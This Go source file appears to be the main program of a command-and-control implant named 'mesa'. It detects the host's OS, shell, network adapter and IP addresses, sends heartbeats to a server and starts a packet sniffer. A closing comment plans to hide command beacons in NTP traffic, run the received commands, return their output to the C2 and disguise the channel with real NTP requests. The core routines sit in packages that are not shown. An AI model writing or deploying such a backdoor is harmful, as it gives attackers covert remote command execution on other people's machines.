package main

import (

	//"os"

	//"strings"
	//"bytes"
	//"log"

	//"mesa/client/pkg/ntppacket"
	//"mesa/client/pkg/listener"

	"fmt"
	"mesa/goclient/pkg/agent"
	"mesa/goclient/pkg/handler"
	"time"
	//"github.com/google/gopacket"
	//"github.com/google/gopacket/pcap"
)

var newAgent agent.Agent

func init() {
	newAgent = agent.Agent{}
	newAgent.OpSys, newAgent.ShellType, newAgent.ShellFlag = agent.DetectOS()
	newAgent.IFace = agent.GetNetAdapter(newAgent)
	newAgent.ServerIP = agent.GetServerIP()
	newAgent.MyIP = agent.GetMyIP()
}

func main() {
	agent.Setup(newAgent)

	ticker := time.NewTicker(15 * time.Second) //heartbeat ticker, TODO change back to minute
	done := make(chan bool)

	go func() {
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				handler.Heartbeat(newAgent)
				fmt.Println("testing heartbeat")
			}
		}
	}()

	handler.StartSniffer(newAgent)

	ticker.Stop()
	done <- true
	fmt.Println("Ticker stopped")

}

/*


raw sockets

recieve beacon, see ping/comd id
parse/decode bytes into readable
->run commmand
->get output
->encode output
->send output back to c2
->make it so NTP packet isn't actually read in
-> send actual NTP request for time

->see ping
->resync request
->receive actual time info from NTP server



client also must check to see if the time service is running


TODO agent is compiled for specific os, sends initial ping



//TODO add firewall command rule in setup
*/
